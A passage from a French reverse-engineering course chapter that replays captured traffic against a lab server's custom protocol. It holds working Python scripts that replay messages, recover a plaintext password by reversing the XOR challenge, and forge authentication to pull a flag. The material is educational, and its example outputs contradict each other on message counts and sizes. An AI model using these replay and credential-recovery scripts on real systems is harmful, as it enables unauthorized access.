🔝 Retour au [Sommaire](/SOMMAIRE.md)

# 23.4 — Replay Attack : rejouer une requête capturée

> 🎯 **Objectif de cette section** : valider la compréhension du protocole en rejouant une communication capturée vers le serveur réel, observer ce qui fonctionne et ce qui échoue, puis comprendre *pourquoi* certaines séquences ne sont pas rejouables. À la fin de cette section, vous saurez distinguer un protocole vulnérable au replay d'un protocole qui s'en protège, et vous aurez mis en évidence le rôle exact du challenge dans le mécanisme d'authentification.

---

## Principe du replay attack

Un replay attack consiste à **capturer une communication légitime entre un client et un serveur, puis à la renvoyer telle quelle** au serveur à un moment ultérieur, en espérant que le serveur l'accepte comme si c'était une nouvelle session authentique.

C'est le test de validation le plus direct qu'on puisse faire après avoir capturé et documenté un protocole. Si le replay fonctionne intégralement, cela signifie que le protocole n'a aucune protection contre la rejouabilité — ce qui est une vulnérabilité dans la plupart des contextes. Si le replay échoue à un point précis, cela révèle l'existence d'un mécanisme anti-replay (nonce, timestamp, compteur de séquence…) qu'il faudra comprendre et contourner pour écrire un client fonctionnel.

Dans notre contexte pédagogique, le replay est surtout un **outil de diagnostic** : il permet de tester les hypothèses formulées aux sections 23.1–23.3 en conditions réelles, sans encore écrire de code. On rejoue, on observe la réaction du serveur, et on ajuste la compréhension du protocole.

---

## Préparer le matériel de replay

### Ce dont on dispose

À ce stade, on a accumulé plusieurs sources exploitables :

- **`ch23_capture.pcap`** — la capture Wireshark complète d'une session client-serveur réussie.  
- **`ch23_stream.bin`** — le flux TCP brut exporté via "Follow TCP Stream".  
- **`server_trace.log` / `client_trace.log`** — les traces `strace` avec les buffers hexadécimaux de chaque `send`/`recv`.  
- **La spécification du protocole** — reconstruite en 23.2 et validée visuellement en 23.3.

Pour le replay, on a besoin d'extraire les **messages envoyés par le client uniquement**, dans l'ordre, sous forme de données brutes prêtes à être renvoyées au serveur.

### Extraire les messages client depuis Wireshark

Dans Wireshark, on isole le trafic client → serveur :

```
tcp.port == 4444 && tcp.len > 0 && ip.src == 127.0.0.1 && tcp.srcport != 4444
```

Ce filtre ne conserve que les paquets envoyés *par le client* (port source différent de 4444, car 4444 est le port du serveur). En pratique, sur loopback, les deux adresses IP sont `127.0.0.1`, donc on filtre par port source ou destination.

Une approche plus fiable : utiliser le "Follow TCP Stream" et sélectionner **une seule direction** dans le menu déroulant en bas de la fenêtre. On choisit la direction client → serveur (affichée en rouge par défaut), on bascule en **"Raw"**, et on exporte le fichier :

```
ch23_client_only.bin
```

Ce fichier contient la concaténation de tous les messages envoyés par le client pendant la session capturée, dans l'ordre : HELLO, AUTH, CMD (PING, INFO, LIST, READ×4), QUIT.

### Extraire les messages depuis `strace`

Alternativement, on peut extraire les messages depuis les traces `strace` du client avec un script Python ciblé :

```python
#!/usr/bin/env python3
"""
extract_client_messages.py  
Extrait les messages envoyés par le client depuis un log strace.  
Produit un fichier binaire par message + un fichier concaténé.  
"""

import re  
import sys  
import os  

def extract_buffers(trace_file):
    """Parse les appels write/send et retourne les buffers bruts."""
    messages = []
    
    with open(trace_file) as f:
        for line in f:
            # Chercher write(fd, "...", N) ou send(fd, "...", N, flags)
            m = re.search(
                r'(?:write|send)\((\d+),\s*"((?:[^"\\]|\\.)*)"\s*,\s*(\d+)',
                line
            )
            if not m:
                continue
            
            fd = int(m.group(1))
            raw = m.group(2)
            length = int(m.group(3))
            
            # Ignorer les écritures sur stdout/stderr (fd 1, 2)
            if fd <= 2:
                continue
            
            # Convertir les séquences \xHH en octets
            data = b""
            i = 0
            while i < len(raw):
                if raw[i] == '\\' and i + 1 < len(raw):
                    if raw[i+1] == 'x' and i + 3 < len(raw):
                        data += bytes.fromhex(raw[i+2:i+4])
                        i += 4
                    elif raw[i+1] == '0':
                        data += b'\x00'
                        i += 2
                    elif raw[i+1] == 'n':
                        data += b'\n'
                        i += 2
                    elif raw[i+1] == 't':
                        data += b'\t'
                        i += 2
                    elif raw[i+1] == '\\':
                        data += b'\\'
                        i += 2
                    else:
                        data += raw[i].encode()
                        i += 1
                else:
                    data += raw[i].encode()
                    i += 1
            
            messages.append(data)
    
    return messages

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <strace_log> [output_dir]")
        sys.exit(1)
    
    trace_file = sys.argv[1]
    output_dir = sys.argv[2] if len(sys.argv) > 2 else "replay_data"
    
    os.makedirs(output_dir, exist_ok=True)
    
    messages = extract_buffers(trace_file)
    
    print(f"[+] Extracted {len(messages)} messages from {trace_file}")
    
    # Sauvegarder chaque message individuellement
    for i, msg in enumerate(messages):
        path = os.path.join(output_dir, f"msg_{i:02d}.bin")
        with open(path, 'wb') as f:
            f.write(msg)
        
        # Afficher un résumé
        msg_type = msg[1] if len(msg) > 1 else 0
        print(f"    [{i:02d}] type=0x{msg_type:02X}  "
              f"len={len(msg)} bytes  → {path}")
    
    # Sauvegarder la concaténation complète
    concat_path = os.path.join(output_dir, "all_client_messages.bin")
    with open(concat_path, 'wb') as f:
        for msg in messages:
            f.write(msg)
    
    print(f"\n[+] Concatenated stream: {concat_path}")

if __name__ == "__main__":
    main()
```

```bash
$ python3 extract_client_messages.py client_trace.log replay_data/
[+] Extracted 10 messages from client_trace.log
    [00] type=0x01  len=12 bytes  → replay_data/msg_00.bin
    [01] type=0x02  len=22 bytes  → replay_data/msg_01.bin
    [02] type=0x03  len=5  bytes  → replay_data/msg_02.bin
    [03] type=0x03  len=5  bytes  → replay_data/msg_03.bin
    [04] type=0x03  len=5  bytes  → replay_data/msg_04.bin
    [05] type=0x03  len=6  bytes  → replay_data/msg_05.bin
    [06] type=0x03  len=6  bytes  → replay_data/msg_06.bin
    [07] type=0x03  len=6  bytes  → replay_data/msg_07.bin
    [08] type=0x03  len=6  bytes  → replay_data/msg_08.bin
    [09] type=0x04  len=4  bytes  → replay_data/msg_09.bin

[+] Concatenated stream: replay_data/all_client_messages.bin
```

On dispose maintenant de chaque message client sous forme de fichier binaire individuel, plus un fichier concaténé. Les 10 messages correspondent à la séquence complète : HELLO, AUTH, puis 7 commandes (PING, INFO, LIST, READ×4), et enfin QUIT. Cette granularité est importante : on va d'abord tenter un replay total, puis un replay message par message pour isoler le point de rupture.

---

## Replay naïf — tout d'un bloc

### Avec `ncat` (netcat)

L'approche la plus brute consiste à envoyer le flux client complet d'un seul coup avec `ncat` :

```bash
# Lancer le serveur dans un terminal
$ ./build/server_O0

# Dans un second terminal, envoyer le flux capturé
$ ncat 127.0.0.1 4444 < replay_data/all_client_messages.bin | xxd | head -40
```

`ncat` ouvre une connexion TCP, envoie le contenu du fichier, et affiche la réponse du serveur en hexadécimal via `xxd`.

### Observer la réponse du serveur

Le résultat typique est le suivant :

```
00000000: c081 000f 5745 4c43 4f4d 4500 .... ....  ....WELCOME.....
00000010: c082 0002 0000                           ......
```

On observe :

1. **Le HELLO (`0x81`) a fonctionné** : le serveur a répondu avec `WELCOME` et un nouveau challenge. C'est attendu — le HELLO ne dépend d'aucune donnée dynamique.  
2. **L'AUTH (`0x82`) a échoué** : le status est `0x00` (FAIL) au lieu de `0x01` (OK). Le serveur a rejeté l'authentification.  
3. **Aucune réponse aux commandes** : le serveur n'a pas traité les messages CMD et QUIT car la session n'a jamais atteint l'état `AUTHENTICATED`.

Le replay naïf a échoué. Mais l'échec est informatif.

### Comprendre l'échec

L'authentification a échoué parce que le **challenge est différent**. Rappelons le mécanisme découvert à la section 23.2 :

1. Le serveur génère un challenge aléatoire de 8 octets à chaque nouvelle connexion.  
2. Le client XOR le mot de passe avec ce challenge avant de l'envoyer.  
3. Le serveur XOR le mot de passe reçu avec *son* challenge pour retrouver le mot de passe en clair.

Le message AUTH capturé contient le mot de passe XOR-é avec l'**ancien** challenge (celui de la session originale). Quand on le rejoue, le serveur le XOR avec le **nouveau** challenge (celui qu'il vient de générer pour cette nouvelle connexion). Le résultat n'est pas le bon mot de passe, donc l'authentification échoue.

C'est exactement le rôle du challenge/nonce : **empêcher le replay de l'authentification**. Même si un attaquant capture l'intégralité du trafic, il ne peut pas rejoueur la séquence AUTH car elle est liée à un challenge éphémère.

> 💡 **Point clé RE** : cette observation confirme que le champ de 8 octets dans la réponse HELLO n'est pas décoratif — c'est un composant actif du mécanisme d'authentification. Sans le désassemblage de la section 23.2, on aurait pu penser que ces octets étaient un identifiant de session ou un padding. Le replay prouve leur rôle fonctionnel.

---

## Replay sélectif — message par message

Le replay total ayant échoué à cause du challenge, on passe à une approche plus fine : envoyer les messages un par un avec un script Python qui **lit les réponses du serveur** entre chaque envoi. Cela permet d'observer exactement à quel moment la session diverge.

### Script de replay interactif

```python
#!/usr/bin/env python3
"""
replay_interactive.py  
Rejoue les messages capturés un par un, en lisant la réponse  
du serveur entre chaque envoi.  

Usage: python3 replay_interactive.py <host> <port> <message_dir>
"""

import socket  
import struct  
import sys  
import os  
import glob  

PROTO_MAGIC = 0xC0  
HEADER_SIZE = 4  

MSG_TYPE_NAMES = {
    0x01: "HELLO_REQ",   0x81: "HELLO_RESP",
    0x02: "AUTH_REQ",    0x82: "AUTH_RESP",
    0x03: "CMD_REQ",     0x83: "CMD_RESP",
    0x04: "QUIT_REQ",    0x84: "QUIT_RESP",
    0xFF: "ERROR",
}

def recv_message(sock):
    """Recevoir un message protocolaire complet."""
    header = b""
    while len(header) < HEADER_SIZE:
        chunk = sock.recv(HEADER_SIZE - len(header))
        if not chunk:
            return None, None, None
        header += chunk
    
    magic = header[0]
    msg_type = header[1]
    payload_len = struct.unpack(">H", header[2:4])[0]
    
    payload = b""
    while len(payload) < payload_len:
        chunk = sock.recv(payload_len - len(payload))
        if not chunk:
            return msg_type, b"", payload_len
        payload += chunk
    
    return msg_type, payload, payload_len

def hexdump_line(data, max_bytes=32):
    """Affichage compact d'un buffer en hex + ASCII."""
    hex_part = " ".join(f"{b:02X}" for b in data[:max_bytes])
    ascii_part = "".join(
        chr(b) if 32 <= b < 127 else "." for b in data[:max_bytes]
    )
    suffix = "..." if len(data) > max_bytes else ""
    return f"{hex_part}{suffix}  |{ascii_part}{suffix}|"

def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <host> <port> <message_dir>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    msg_dir = sys.argv[3]
    
    # Charger les messages dans l'ordre
    msg_files = sorted(glob.glob(os.path.join(msg_dir, "msg_*.bin")))
    if not msg_files:
        print(f"[!] No message files found in {msg_dir}/")
        sys.exit(1)
    
    messages = []
    for path in msg_files:
        with open(path, "rb") as f:
            messages.append(f.read())
    
    print(f"[+] Loaded {len(messages)} messages from {msg_dir}/")
    print(f"[*] Connecting to {host}:{port}...\n")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    sock.connect((host, port))
    
    for i, msg in enumerate(messages):
        msg_type = msg[1] if len(msg) > 1 else 0
        type_name = MSG_TYPE_NAMES.get(msg_type, f"UNKNOWN(0x{msg_type:02X})")
        
        print(f"{'='*60}")
        print(f"  Message {i}: {type_name} ({len(msg)} bytes)")
        print(f"{'='*60}")
        print(f"  TX → {hexdump_line(msg)}")
        
        # Envoyer le message capturé
        sock.sendall(msg)
        
        # Recevoir la réponse
        try:
            resp_type, resp_payload, resp_len = recv_message(sock)
            
            if resp_type is None:
                print(f"  RX ← [connection closed by server]")
                print(f"\n[!] Server closed connection after message {i}.")
                break
            
            resp_name = MSG_TYPE_NAMES.get(
                resp_type, f"UNKNOWN(0x{resp_type:02X})"
            )
            
            full_resp = bytes([PROTO_MAGIC, resp_type]) + \
                        struct.pack(">H", resp_len) + resp_payload
            
            print(f"  RX ← {resp_name} ({resp_len} bytes payload)")
            print(f"       {hexdump_line(full_resp)}")
            
            # Analyse spécifique selon le type de réponse
            if resp_type == 0xFF:  # ERROR
                error_code = resp_payload[0] if resp_payload else 0
                error_msg = resp_payload[1:].decode("utf-8", errors="replace")
                print(f"  ⚠  ERROR code=0x{error_code:02X}: {error_msg}")
                print(f"\n[!] Server returned error. Stopping replay.")
                break
            
            if resp_type == 0x82:  # AUTH_RESP
                status = resp_payload[1] if len(resp_payload) > 1 else 0
                if status == 0x01:
                    print(f"  ✓  AUTH SUCCESS")
                else:
                    print(f"  ✗  AUTH FAILED (status=0x{status:02X})")
                    print(f"\n[!] Authentication failed — "
                          f"challenge mismatch expected.")
                    print(f"    The captured AUTH payload was XOR'd with")
                    print(f"    the original challenge, not the current one.")
                    # On continue quand même pour observer la suite
            
            if resp_type == 0x81:  # HELLO_RESP
                if len(resp_payload) >= 15:
                    challenge = resp_payload[7:15]
                    print(f"  ℹ  New challenge: "
                          f"{challenge.hex().upper()}")
                    print(f"     (differs from captured session)")
        
        except socket.timeout:
            print(f"  RX ← [timeout — no response]")
        
        print()
    
    sock.close()
    print("[*] Replay complete.")

if __name__ == "__main__":
    main()
```

### Exécution et analyse de la sortie

```bash
$ python3 replay_interactive.py 127.0.0.1 4444 replay_data/
[+] Loaded 8 messages from replay_data/
[*] Connecting to 127.0.0.1:4444...

============================================================
  Message 0: HELLO_REQ (12 bytes)
============================================================
  TX → C0 01 00 08 48 45 4C 4C 4F 00 00 00  |....HELLO...|
  RX ← HELLO_RESP (15 bytes payload)
       C0 81 00 0F 57 45 4C 43 4F 4D 45 00 B7 3A 9E 21 ...  |....WELCOME..:!...|
  ℹ  New challenge: B73A9E21F0884C17
     (differs from captured session)

============================================================
  Message 1: AUTH_REQ (26 bytes)
============================================================
  TX → C0 02 00 16 05 61 64 6D 69 6E 0B 72 ...  |.....admin.r...|
  RX ← AUTH_RESP (2 bytes payload)
       C0 82 00 02 00 00  |......|
  ✗  AUTH FAILED (status=0x00)

  [!] Authentication failed — challenge mismatch expected.
      The captured AUTH payload was XOR'd with
      the original challenge, not the current one.

============================================================
  Message 2: CMD_REQ (5 bytes)
============================================================
  TX → C0 03 00 01 01  |.....|
  RX ← ERROR (19 bytes payload)
       C0 FF 00 13 03 41 75 74 68 65 6E 74 69 ...  |.....Authenti...|
  ⚠  ERROR code=0x03: Authenticate first

[!] Server returned error. Stopping replay.
[*] Replay complete.
```

La sortie confirme point par point ce qu'on attendait :

1. **Message 0 (HELLO)** : le replay fonctionne. Le serveur accepte le HELLO et répond avec un nouveau challenge (`B73A9E21F0884C17`), différent de celui de la session capturée.

2. **Message 1 (AUTH)** : le replay échoue. Le mot de passe XOR-é avec l'ancien challenge ne produit pas le bon clair quand le serveur le XOR avec le nouveau challenge. Status `0x00` = échec.

3. **Message 2 (CMD)** : le serveur rejette la commande avec l'erreur `ERR_WRONG_STATE` (code `0x03`) et le texte `"Authenticate first"`. La session est restée bloquée en état `HELLO_DONE`, elle n'a jamais atteint `AUTHENTICATED`.

---

## Replay adaptatif — contourner le challenge

Le replay naïf échoue à l'étape AUTH à cause du challenge. Mais on connaît maintenant le mécanisme exact (XOR du mot de passe avec le challenge, découvert en 23.2). On peut donc construire un **replay adaptatif** qui :

1. Envoie le HELLO capturé tel quel (il fonctionne).  
2. Lit le **nouveau challenge** dans la réponse HELLO.  
3. **Recalcule** le payload AUTH en XOR-ant le mot de passe avec le nouveau challenge.  
4. Envoie le AUTH corrigé.  
5. Continue avec les commandes capturées telles quelles (elles ne dépendent pas du challenge).

### Récupérer le mot de passe depuis la capture

On dispose du message AUTH capturé et du challenge de la session originale. On peut donc **inverser le XOR** pour retrouver le mot de passe en clair :

```python
# Données extraites de la capture originale (section 23.1)
original_challenge = bytes.fromhex("A37B01F98C22D45E")  # du HELLO_RESP capturé

# Payload AUTH capturé (après l'en-tête de 4 octets)
auth_payload = bytes.fromhex(
    "05"                          # user_len = 5
    "61646D696E"                  # "admin"
    "0B"                          # pass_len = 11
    "D048628CFE11841ED00820"      # password XOR'd with challenge
)

# Extraire le mot de passe XOR-é
user_len = auth_payload[0]  
pass_offset = 1 + user_len  
pass_len = auth_payload[pass_offset]  
pass_xored = bytearray(auth_payload[pass_offset + 1 : pass_offset + 1 + pass_len])  

# Inverser le XOR : password_clear = password_xored XOR original_challenge
password_clear = bytearray(pass_len)  
for i in range(pass_len):  
    password_clear[i] = pass_xored[i] ^ original_challenge[i % len(original_challenge)]

print(f"Username : {'admin'}")  
print(f"Password : {password_clear.decode('utf-8')}")  
```

```
Username : admin  
Password : s3cur3P@ss!  
```

On a récupéré le mot de passe en clair. C'est une information capitale : elle permet non seulement de construire un replay adaptatif, mais aussi d'écrire un client de remplacement complet (section 23.5).

> 📝 **Note** : dans un scénario réel, récupérer le mot de passe en clair depuis une capture réseau est une vulnérabilité majeure du protocole. Un XOR avec un nonce n'est **pas** un mécanisme d'authentification sûr — il protège contre le replay naïf mais pas contre un attaquant qui a capturé le handshake complet (challenge + réponse). Un protocole robuste utiliserait un HMAC ou un challenge-response basé sur un hash cryptographique, où le serveur ne pourrait pas (et n'aurait pas besoin de) retrouver le mot de passe en clair.

### Script de replay adaptatif

```python
#!/usr/bin/env python3
"""
replay_adaptive.py  
Replay adaptatif : recalcule le payload AUTH avec le nouveau challenge.  

Usage: python3 replay_adaptive.py <host> <port> <message_dir>
"""

import socket  
import struct  
import sys  
import os  
import glob  

PROTO_MAGIC    = 0xC0  
HEADER_SIZE    = 4  
CHALLENGE_LEN  = 8  

def recv_message(sock):
    """Recevoir un message protocolaire complet."""
    header = b""
    while len(header) < HEADER_SIZE:
        chunk = sock.recv(HEADER_SIZE - len(header))
        if not chunk:
            return None, None
        header += chunk
    
    msg_type = header[1]
    payload_len = struct.unpack(">H", header[2:4])[0]
    
    payload = b""
    while len(payload) < payload_len:
        chunk = sock.recv(payload_len - len(payload))
        if not chunk:
            break
        payload += chunk
    
    return msg_type, payload

def send_message(sock, msg_type, payload):
    """Envoyer un message protocolaire."""
    header = struct.pack(">BBH", PROTO_MAGIC, msg_type, len(payload))
    sock.sendall(header + payload)

def xor_bytes(data, key):
    """XOR cyclique de data avec key."""
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

def rebuild_auth(original_auth_payload, original_challenge, new_challenge):
    """
    Recalcule le payload AUTH pour un nouveau challenge.
    
    1. Extraire le mot de passe XOR-é avec l'ancien challenge.
    2. Inverser le XOR pour obtenir le mot de passe en clair.
    3. Ré-appliquer le XOR avec le nouveau challenge.
    4. Reconstruire le payload complet.
    """
    user_len = original_auth_payload[0]
    username = original_auth_payload[1 : 1 + user_len]
    
    pass_offset = 1 + user_len
    pass_len = original_auth_payload[pass_offset]
    pass_xored_old = original_auth_payload[
        pass_offset + 1 : pass_offset + 1 + pass_len
    ]
    
    # Étape clé : ancien_xor XOR ancien_challenge = clair
    #             clair XOR nouveau_challenge = nouveau_xor
    # Raccourci : nouveau_xor = ancien_xor XOR ancien_challenge XOR nouveau_challenge
    password_clear = xor_bytes(pass_xored_old, original_challenge)
    pass_xored_new = xor_bytes(password_clear, new_challenge)
    
    # Reconstruire le payload
    new_payload = (
        bytes([user_len]) +
        username +
        bytes([pass_len]) +
        pass_xored_new
    )
    
    return new_payload, password_clear.decode("utf-8", errors="replace")

def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <host> <port> <message_dir>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    msg_dir = sys.argv[3]
    
    # Charger les messages capturés
    msg_files = sorted(glob.glob(os.path.join(msg_dir, "msg_*.bin")))
    messages = []
    for path in msg_files:
        with open(path, "rb") as f:
            messages.append(f.read())
    
    print(f"[+] Loaded {len(messages)} captured messages")
    
    # ── Phase 1 : extraire le challenge original depuis les données ──
    # On a besoin du challenge original pour inverser le XOR.
    # En pratique, il faudrait aussi avoir capturé la réponse HELLO du
    # serveur. Ici, on le passe en argument ou on le lit depuis un fichier.
    #
    # Alternative : si on a le pcap complet, on peut extraire le challenge
    # du HELLO_RESP original avec un script ou depuis Wireshark.
    
    original_challenge_hex = input(
        "[?] Enter original challenge (hex, from captured HELLO_RESP): "
    ).strip()
    original_challenge = bytes.fromhex(original_challenge_hex)
    assert len(original_challenge) == CHALLENGE_LEN
    
    # ── Phase 2 : connexion et replay adaptatif ──
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    sock.connect((host, port))
    print(f"[+] Connected to {host}:{port}\n")
    
    new_challenge = None
    
    for i, msg in enumerate(messages):
        msg_type = msg[1]
        payload = msg[HEADER_SIZE:]  # tout après le header de 4 octets
        
        # ── Adapter le message AUTH ──
        if msg_type == 0x02 and new_challenge is not None:
            print(f"[*] Message {i}: AUTH_REQ — adapting to new challenge...")
            
            new_payload, password = rebuild_auth(
                payload, original_challenge, new_challenge
            )
            print(f"    Recovered password: '{password}'")
            print(f"    Old XOR: {payload[1+payload[0]+1:][:8].hex().upper()}")
            print(f"    New XOR: {new_payload[1+new_payload[0]+1:][:8].hex().upper()}")
            
            send_message(sock, msg_type, new_payload)
        else:
            # Envoyer tel quel
            print(f"[*] Message {i}: type=0x{msg_type:02X} — "
                  f"replaying as-is ({len(msg)} bytes)")
            sock.sendall(msg)
        
        # ── Recevoir la réponse ──
        try:
            resp_type, resp_payload = recv_message(sock)
            
            if resp_type is None:
                print(f"    ← [connection closed]\n")
                break
            
            print(f"    ← Response: type=0x{resp_type:02X} "
                  f"({len(resp_payload)} bytes)")
            
            # Extraire le challenge du HELLO_RESP
            if resp_type == 0x81 and len(resp_payload) >= 15:
                new_challenge = resp_payload[7:15]
                print(f"    ℹ  New challenge: {new_challenge.hex().upper()}")
            
            # Vérifier le résultat AUTH
            if resp_type == 0x82 and len(resp_payload) >= 2:
                if resp_payload[1] == 0x01:
                    print(f"    ✓  AUTH SUCCESS — replay adaptatif réussi !")
                else:
                    print(f"    ✗  AUTH FAILED")
            
            # Afficher les données CMD_RESP
            if resp_type == 0x83 and len(resp_payload) > 1:
                if resp_payload[0] == 0x01:
                    text = resp_payload[1:].decode("utf-8", errors="replace")
                    preview = text[:60].replace("\n", " ↵ ")
                    print(f"    ✓  CMD OK: {preview}...")
            
            # Erreur serveur
            if resp_type == 0xFF:
                err = resp_payload[1:].decode("utf-8", errors="replace")
                print(f"    ⚠  ERROR: {err}")
                break
        
        except socket.timeout:
            print(f"    ← [timeout]")
        
        print()
    
    sock.close()
    print("[+] Adaptive replay complete.")

if __name__ == "__main__":
    main()
```

### Exécution du replay adaptatif

```
$ python3 replay_adaptive.py 127.0.0.1 4444 replay_data/
[+] Loaded 8 captured messages
[?] Enter original challenge (hex, from captured HELLO_RESP): A37B01F98C22D45E
[+] Connected to 127.0.0.1:4444

[*] Message 0: type=0x01 — replaying as-is (12 bytes)
    ← Response: type=0x81 (15 bytes)
    ℹ  New challenge: B73A9E21F0884C17

[*] Message 1: AUTH_REQ — adapting to new challenge...
    Recovered password: 's3cur3P@ss!'
    Old XOR: D048628CFE11841E
    New XOR: C409FD5482BB1C57
    ← Response: type=0x82 (2 bytes)
    ✓  AUTH SUCCESS — replay adaptatif réussi !

[*] Message 2: type=0x03 — replaying as-is (5 bytes)
    ← Response: type=0x83 (5 bytes)
    ✓  CMD OK: PONG...

[*] Message 3: type=0x03 — replaying as-is (5 bytes)
    ← Response: type=0x83 (68 bytes)
    ✓  CMD OK: ch23-network server v1.0 ↵ Protocol: custom binary ↵ ...

[*] Message 4: type=0x03 — replaying as-is (5 bytes)
    ← Response: type=0x83 (52 bytes)
    ✓  CMD OK: ...

[*] Message 5: type=0x03 — replaying as-is (6 bytes)
    ← Response: type=0x83 (56 bytes)
    ✓  CMD OK: Welcome to the secret server. ↵ Access level: CLA...

[*] Message 6: type=0x03 — replaying as-is (6 bytes)
    ← Response: type=0x83 (41 bytes)
    ✓  CMD OK: FLAG{pr0t0c0l_r3v3rs3d_succ3ssfully} ↵ ...

[*] Message 7: type=0x04 — replaying as-is (4 bytes)
    ← Response: type=0x84 (3 bytes)

[+] Adaptive replay complete.
```

Le replay adaptatif fonctionne intégralement. En ajustant uniquement le message AUTH (recalcul du XOR avec le nouveau challenge), toute la session se déroule normalement. Les commandes CMD et QUIT ne dépendent pas du challenge et sont rejouables telles quelles.

---

## Ce que le replay nous apprend

### Bilan des protections du protocole

| Propriété | Protégé ? | Mécanisme | Contournable ? |  
|-----------|-----------|-----------|----------------|  
| Replay intégral de session | Oui | Challenge aléatoire par session | Oui, si on capture le handshake complet |  
| Confidentialité du mot de passe | Partiel | XOR avec le challenge | Oui — XOR est réversible avec le challenge |  
| Replay des commandes post-AUTH | Non | Aucun (pas de nonce par message) | Directement rejouable |  
| Intégrité des messages | Non | Aucun checksum/HMAC | Modifiable sans détection |

### Vulnérabilités identifiées

1. **Le XOR n'est pas un mécanisme d'authentification sûr.** Un attaquant qui capture le handshake (challenge en clair) et la réponse AUTH (mot de passe XOR-é) peut retrouver le mot de passe en clair par simple XOR inverse. Un HMAC-SHA256 avec le challenge comme salt serait résistant à cette attaque.

2. **Pas de protection contre le replay de commandes.** Une fois la session établie, chaque message CMD peut être rejoué dans une autre session authentifiée. Il n'y a pas de numéro de séquence, de timestamp, ni de MAC par message.

3. **Pas de chiffrement du canal.** Tout le trafic est en clair (à l'exception du XOR sur le mot de passe). Un observateur réseau voit les commandes, les réponses, et les données échangées.

Ces observations sont typiques d'un protocole propriétaire non conçu par un cryptographe — exactement le type de cible que l'on rencontre en reverse engineering de logiciels industriels, embarqués ou legacy.

---

## Replay avec d'autres outils

### Avec `pwntools`

Pour les lecteurs déjà familiers avec `pwntools` (chapitre 11, section 11.9), le replay est plus concis :

```python
from pwn import *

r = remote("127.0.0.1", 4444)

# Envoyer le HELLO capturé
r.send(open("replay_data/msg_00.bin", "rb").read())

# Lire la réponse HELLO
resp = r.recv(1024)  
new_challenge = resp[4+7 : 4+7+8]  
log.info(f"New challenge: {new_challenge.hex()}")  

# ... adapter et envoyer AUTH, puis les commandes

r.close()
```

### Avec `socat`

Pour un replay brut sans script, `socat` permet de connecter un fichier directement à un socket TCP avec un léger délai entre les écritures :

```bash
$ socat -d TCP:127.0.0.1:4444 FILE:replay_data/all_client_messages.bin
```

Comme `ncat`, cela ne permet pas de lire les réponses de manière interactive ni d'adapter les messages. C'est utile uniquement pour le replay naïf rapide.

---

## Récapitulatif de la section

| Étape | Résultat | Ce qu'on apprend |  
|-------|----------|------------------|  
| Extraction des messages client | Fichiers `msg_00.bin` à `msg_07.bin` | Données prêtes pour le replay |  
| Replay naïf (tout d'un bloc) | HELLO OK, AUTH FAIL | Le challenge empêche le replay de l'authentification |  
| Replay interactif (message par message) | Échec précis identifié au message AUTH | Confirmation du rôle du challenge |  
| Inversion du XOR | Mot de passe en clair récupéré | Le XOR est réversible — vulnérabilité du protocole |  
| Replay adaptatif | Session complète réussie | Validation intégrale de la spécification du protocole |

Le replay adaptatif est la preuve ultime que notre compréhension du protocole est correcte. Chaque champ, chaque mécanisme, chaque transition d'état a été vérifié en conditions réelles. On est maintenant prêt pour la dernière étape du chapitre : écrire un **client de remplacement autonome** en Python avec `pwntools`, qui ne rejoue pas une capture mais **génère ses propres messages** à partir de la spécification (section 23.5).

⏭️ [Écrire un client de remplacement complet avec `pwntools`](/23-network/05-client-pwntools.md)
